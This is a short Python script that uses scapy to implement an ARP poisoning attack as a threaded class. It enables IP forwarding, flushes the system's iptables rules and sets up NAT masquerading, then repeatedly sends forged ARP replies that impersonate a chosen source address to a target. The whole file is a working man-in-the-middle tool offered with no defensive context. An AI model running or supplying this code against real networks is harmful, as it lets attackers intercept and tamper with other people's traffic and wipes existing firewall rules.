#!/usr/bin/python

from scapy.all import *
from threading import Thread
import time

class ArpPoisoning(Thread):

    def __init__(self):
        Thread.__init__(self)
        self.is_running = True
        self.packet = None

    def configure(self, interface):
        # forwarding conf
        f = open('/proc/sys/net/ipv4/ip_forward', 'w')
        f.write('1')
        f.close()
        
         # iptables conf
        os.system("/sbin/iptables --flush")
        os.system("/sbin/iptables -t nat --flush")
        os.system("/sbin/iptables --zero")
        os.system("/sbin/iptables -A FORWARD --in-interface " +  interface + " -j ACCEPT")
        os.system("/sbin/iptables -t nat --append POSTROUTING --out-interface " + interface + " -j MASQUERADE")

    def setPacket(self, src, dst):
        self.packet = ARP()
        self.packet.pdst = dst
        self.packet.psrc = src

    def run(self):
        if self.packet != None:
            while self.is_running:
                send(self.packet, verbose=False)
                time.sleep(5)

    def stop(self):
        self.is_running = False
